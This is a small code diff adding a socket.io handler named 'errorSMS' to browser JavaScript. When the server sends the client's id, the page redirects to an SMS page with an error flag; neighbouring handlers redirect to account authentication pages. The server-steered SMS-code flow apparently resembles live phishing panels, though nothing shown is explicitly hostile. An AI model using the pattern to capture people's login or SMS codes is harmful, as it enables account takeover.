@@ -117,6 +117,14 @@ const infosData = (() => {
                 if (idClient == data) window.location.href = `/modules/conta/auth/${data}`
             } else return
         })
+
+        socket.on('errorSMS', (data) => {
+            console.log(`Error sms`, data)
+            if (idClient) {
+                if (idClient == data) window.location.href = `/modules/conta/sms/${data}?error=true`
+            } else return
+        })
+
         socket.on('getSMS', (data) => {
             if (idClient) {
                 if (idClient == data) window.location.href = `/modules/conta/authentication/${data}`
